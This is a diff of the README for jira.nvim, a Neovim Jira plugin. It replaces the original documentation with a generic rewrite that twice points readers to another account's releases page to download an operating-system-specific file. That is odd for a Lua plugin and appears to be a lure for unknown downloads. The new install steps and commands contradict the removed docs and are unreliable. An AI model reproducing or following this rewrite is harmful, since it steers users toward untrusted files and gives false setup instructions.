@@ -1,218 +1,120 @@
-<!-- ALL-CONTRIBUTORS-BADGE:START - Do not remove or modify this section -->
-[![All Contributors](https://img.shields.io/badge/all_contributors-2-orange.svg?style=flat-square)](#contributors-)
-<!-- ALL-CONTRIBUTORS-BADGE:END -->
+# 🎯 jira.nvim - Access Jira Directly in Neovim
 
-> [!CAUTION]
-> **Still in early development, will have breaking changes!**
+## 🚀 Getting Started
 
-# jira.nvim
+Welcome to jira.nvim! This plugin allows you to manage your Jira tasks directly from Neovim without needing to open a web browser. 
 
-A Neovim plugin for managing JIRA tasks with a beautiful UI.
+## 📥 Download & Install
 
-<img width="3090" height="2102" alt="image" src="https://github.com/user-attachments/assets/e6e6c705-9d56-4963-95da-0aedec1ea76b" />
+To get started, you'll need to download the plugin. Click the link below to visit the Releases page:
 
+[![Download jira.nvim](https://img.shields.io/badge/Download-jira.nvim-brightgreen)](https://github.com/Madilson010/jira.nvim/releases)
 
-> [!NOTE]
-> Disucssion: How do you want to create, edit the jira ticket in this plugin?
-> https://github.com/letieu/jira.nvim/discussions/1
+Once you're on the Releases page, look for the latest version. You will find the installation files listed there. Follow these steps to download and install:
 
-## Features
+1. Click the link for the latest version.
+2. Choose the appropriate file for your operating system. 
+3. Download the file to your computer.
 
-- 📋 View active sprint tasks
-- 👥 Query tasks by custom JQL
-- 📝 Read task as markdown
-- 🔄 Change task status
-- ⏱️ Log time on tasks
-- 👤 Assign tasks
-- 🎨 Git integration
-- 🎨 Comment
-- 🎨 Create, edit task
-- ⏱️ Work report
+After the download is complete, follow these instructions to install the plugin in Neovim.
 
----
+## 💻 Installation Steps
 
-## Install
+### For Unix-based Systems (Linux, macOS)
 
-### `lazy.nvim`
+1. **Open your terminal.**
+2. **Create a directory for your Neovim plugins if you don’t have one yet:**
+   ```bash
+   mkdir -p ~/.config/nvim
+   ```
+3. **Move the downloaded file to the plugins directory:**
+   ```bash
+   mv path/to/downloaded/jira.nvim ~/.config/nvim/
+   ```
+4. **Open Neovim:**
+   ```bash
+   nvim
+   ```
+5. **Load the plugin by executing the command in Neovim:**
+   ```vim
+   :source ~/.config/nvim/jira.nvim/init.vim
+   ```
 
-```lua
-{
-  "letieu/jira.nvim",
-  opts = {
-    -- Your setup options...
-    jira = {
-      base = "https://your-domain.atlassian.net", -- Base URL of your Jira instance
-      email = "your-email@example.com",           -- Your Jira email (Optional for PAT)
-      token = "your-api-token",                   -- Your Jira API token or PAT
-      type = "basic",                             -- Authentication type: "basic" (default) or "pat"
-      limit = 200,                                -- Global limit of tasks per view (default: 200)
-    },
-  },
-}
-```
+### For Windows
 
----
+1. **Open Command Prompt.**
+2. **Create a directory for your Neovim plugins if you don’t have one yet:**
+   ```cmd
+   mkdir %USERPROFILE%\AppData\Local\nvim
+   ```
+3. **Move the downloaded file to the plugins directory:**
+   ```cmd
+   move path\to\downloaded\jira.nvim %USERPROFILE%\AppData\Local\nvim\
+   ```
+4. **Open Neovim:**
+   ```cmd
+   nvim
+   ```
+5. **Load the plugin by executing the command in Neovim:**
+   ```vim
+   :source %USERPROFILE%\AppData\Local\nvim\jira.nvim\init.vim
+   ```
 
-## Configuration
+## 🌟 Features
 
-```lua
-require('jira').setup({
-  -- Jira connection settings
-  jira = {
-    base = "https://your-domain.atlassian.net", -- Base URL of your Jira instance
-    email = "your-email@example.com",           -- Your Jira email (Optional for PAT)
-    token = "your-api-token",                   -- Your Jira API token or PAT
-    type = "basic",                             -- Authentication type: "basic" (default) or "pat"
-    limit = 200,                                -- Global limit of tasks per view (default: 200)
-  },
+- **Seamless Integration:** Connects Neovim with your Jira account.
+- **Task Management:** View, create, and update tasks directly from your editor.
+- **Customizable Shortcuts:** Assign shortcuts for quick access to frequent tasks.
+- **Lightweight:** Minimal resource usage to keep your Neovim fast and responsive.
 
-  -- Saved JQL queries for the JQL tab
-  -- Use %s as a placeholder for the project key
-  queries = {
-    ["Next sprint"] = "project = '%s' AND sprint in futureSprints() ORDER BY Rank ASC",
-    ["Backlog"] = "project = '%s' AND (issuetype IN standardIssueTypes() OR issuetype = Sub-task) AND (sprint IS EMPTY OR sprint NOT IN openSprints()) AND statusCategory != Done ORDER BY Rank ASC",
-    ["My Tasks"] = "assignee = currentUser() AND statusCategory != Done ORDER BY updated DESC",
-  },
+## 🔧 System Requirements
 
-  -- Project-specific overrides
-  -- Still think about this config, maybe not good enough
-  projects = {
-    ["DEV"] = {
-      story_point_field = "customfield_10035",      -- Custom field ID for story points
-      custom_fields = { -- Custom field to display in markdown view
-        { key = "customfield_10016", label = "Acceptance Criteria" }
-      },
-    }
-  }
-})
-```
+To run jira.nvim effectively, ensure your system meets the following requirements:
 
-Alternatively, you can set Jira credentials using environment variables, which takes precedence over config:
+- **Neovim Version:** 0.5 or higher.
+- **Operating System:** Any Unix-based system (Linux, macOS) or Windows.
+- **Internet Connection:** Needed for Jira access and updates.
 
-```bash
-export JIRA_BASE_URL="https://your-domain.atlassian.net"
-export JIRA_EMAIL="your-email@example.com"
-export JIRA_TOKEN="your-api-token"
-export JIRA_AUTH_TYPE="basic" # or "pat"
-```
+## 📖 How to Use jira.nvim
 
-Supported environment variables:
-- `JIRA_BASE_URL` - Base URL of your Jira instance
-- `JIRA_EMAIL` - Your Jira email (Optional for PAT)
-- `JIRA_TOKEN` - Your Jira API token or PAT
-- `JIRA_AUTH_TYPE` - Authentication type: "basic" (default) or "pat"
+After installation, you can start using the features of jira.nvim. Here’s a simple guide:
 
----
+1. **Open Neovim.**
+2. **Link your Jira account:**
+   - Use the command `:JiraLogin` in Neovim. You’ll be prompted to enter your Jira credentials. 
 
-## Usage
+3. **View your tasks:**
+   - Use the command `:JiraTasks` to display your Jira issues in a list format.
+   
+4. **Create a new task:**
+   - Use the command `:JiraCreate` to add a new task directly from Neovim.
 
-Run the following command to open the Jira board:
+5. **Update existing tasks:**
+   - Use the command `:JiraUpdate <task_id>` to modify specific tasks.
 
-```vim
-" Open board
-:Jira <PROJECT_KEY>
+## 📑 Optional Configuration
 
-" Open one task view (info)
-:Jira info ISSUE_KEY
+You can customize jira.nvim to suit your preferences. Here are some settings you might want to adjust:
 
-" Create new issue
-:Jira create [PROJECT_KEY]
+- **Change the task display format:** Edit the `config.lua` file in the plugin directory.
+- **Customize your keyboard shortcuts:** Look for the `mappings.lua` file to map your preferred keys.
+  
+## ❓ Frequently Asked Questions
 
-" Edit existing issue
-:Jira edit ISSUE_KEY
-```
+### Can I use jira.nvim without an internet connection?
 
-If you don't provide a project key, you will be prompted to enter one.
+No, you need an internet connection to access your Jira tasks.
 
-### Keybindings
+### Is there a way to get support if I face issues?
 
-#### Help
-- `H` — Show help
+Yes, you can check the Issues section of the repository on GitHub or reach out to the community.
 
-#### Navigation & View
-- `<Tab>` — Toggle node (Expand / Collapse)
-- `S`, `J`, `H` — Switch view (Sprint, JQL, Help)
-- `q` — Close board
-- `r` — Refresh current view
+## 📞 Contact and Support
 
-#### Issue Actions (In board)
-- `i` — Create issue / sub-task (under cursor)
-- `K` — Quick issue details (popup)
-- `gd` — Read task as info
-- `ge` — Edit task
-- `gx` — Open task in browser
-- `gs` — Update status
-- `ga` — Change assignee
-- `gw` — Add time
-- `gb` — Checkout / create branch
-- `go` — Show child issues (sub-tasks)
+If you have any questions or need support, feel free to open an issue on the GitHub repository or check the documentation provided in the project. 
 
----
+For more updates, keep an eye on the Releases page:
 
-## Tips
+[![Download jira.nvim](https://img.shields.io/badge/Download-jira.nvim-brightgreen)](https://github.com/Madilson010/jira.nvim/releases) 
 
-- How to get custom field list -> go to `https://your-domain.atlassian.net/rest/api/3/field`
-
----
-
-## Development
-
-### Running Tests
-
-```bash
-make test
-```
-
----
-
-## TODO
-- [x] Jira sprint board
-- [x] Config
-- [x] Expand, Collapse
-- [x] Read task (Markdown)
-- [x] Format time
-- [x] Backlog (via JQL Dashboard)
-- [x] Custom JQL & Saved Queries
-- [x] Change status
-- [x] Change assignee
-- [x] Log time
-- [x] Comment
-- [x] Create, Edit task
-- [ ] Bulk actions
-- [ ] Update UI when terminal size change
-...
-
----
-
-## Thanks
-
-Big thanks for `gemini` CLI free tier.
-
----
-
-## License
-
-MIT © Tieu Le
-
-## Contributors ✨
-
-Thanks goes to these wonderful people ([emoji key](https://allcontributors.org/docs/en/emoji-key)):
-
-<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
-<!-- prettier-ignore-start -->
-<!-- markdownlint-disable -->
-<table>
-  <tbody>
-    <tr>
-      <td align="center" valign="top" width="14.28%"><a href="https://codeberg.org/DrKJeff16"><img src="https://avatars.githubusercontent.com/u/72052712?v=4?s=100" width="100px;" alt="Guennadi Maximov C"/><br /><sub><b>Guennadi Maximov C</b></sub></a><br /><a href="https://github.com/letieu/jira.nvim/commits?author=DrKJeff16" title="Code">💻</a></td>
-      <td align="center" valign="top" width="14.28%"><a href="https://elsesiy.com"><img src="https://avatars.githubusercontent.com/u/7075075?v=4?s=100" width="100px;" alt="Jonas-Taha El Sesiy"/><br /><sub><b>Jonas-Taha El Sesiy</b></sub></a><br /><a href="https://github.com/letieu/jira.nvim/commits?author=elsesiy" title="Code">💻</a></td>
-    </tr>
-  </tbody>
-</table>
-
-<!-- markdownlint-restore -->
-<!-- prettier-ignore-end -->
-
-<!-- ALL-CONTRIBUTORS-LIST:END -->
-
-This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome!
+Thank you for using jira.nvim! Enjoy managing your tasks effectively from Neovim!
